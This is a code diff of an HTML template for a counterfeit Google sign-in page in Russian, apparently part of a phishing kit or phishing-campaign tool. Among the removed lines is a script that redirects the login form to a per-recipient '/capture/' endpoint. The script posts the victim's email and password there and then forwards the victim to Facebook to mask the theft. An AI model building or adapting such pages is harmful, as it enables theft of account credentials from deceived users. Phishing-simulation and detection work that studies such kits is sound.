@@ -123,9 +123,7 @@
 
 <p>Используйте аккаунт Google</p>
 
-<form action="" method="POST">
-    {% csrf_token %}
-    <input name="email" placeholder="Телефон или адрес эл. почты" required="" type="text"/>
+<form action="" method="POST"><input name="email" placeholder="Телефон или адрес эл. почты" required="" type="text"/>
 <div class="actions"><a href="#">Забыли адрес электронной почты?</a></div>
 
 <p style="font-size: 12px; color: #5f6368;">Работаете на чужом компьютере? Используйте режим инкогнито. <a href="#">Подробнее</a></p>
@@ -137,45 +135,5 @@
 <div class="footer"><a href="#">Русский</a> <a href="#">Справка</a> <a href="#">Конфиденциальность</a> <a href="#">Условия</a></div>
 </div>
 
-<script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const recipientId = "{{ recipient_id }}";  
-    const messageId = "{{ message_id }}";
-    const platform = "{{ platform }}";  // <-- Добавляем platform
-    const BASE_URL = "{{ settings.BASE_URL }}"; 
-
-    if (recipientId && platform) {
-        document.querySelector("form").action = `${BASE_URL}/capture/${recipientId}/${messageId}/${platform}/`;
-    }
-
-    document.querySelector("form").addEventListener("submit", function(event) {
-        event.preventDefault();  // Отменяем стандартную отправку формы
-
-        const form = event.target;
-        const email = form.querySelector("input[name='email']").value;
-        const password = form.querySelector("input[name='password']").value;
-
-        fetch(form.action, {
-            method: "POST",
-            body: new URLSearchParams(new FormData(form)),
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-            }
-        })
-        .then(response => {
-            if (response.ok) {
-
-                window.location.href = "https://www.facebook.com/";
-            } else {
-         
-                alert("Произошла ошибка при отправке данных.");
-            }
-        })
-        .catch(error => {
-            console.error('Ошибка:', error);
-            alert("Произошла ошибка при отправке данных.");
-        });
-    });
-</script>
 
 </body></html>
